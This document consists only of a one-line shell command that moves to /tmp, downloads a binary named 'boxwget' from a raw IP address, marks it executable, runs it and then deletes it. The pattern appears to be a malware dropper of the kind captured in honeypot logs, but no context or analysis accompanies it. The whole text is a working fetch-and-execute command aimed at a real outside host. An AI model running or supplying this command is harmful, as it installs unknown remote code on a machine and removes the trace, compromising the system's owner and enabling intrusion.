cd /tmp; wget http://86.105.52.37/boxwget; chmod +x boxwget; ./boxwget; rm -rf boxwget
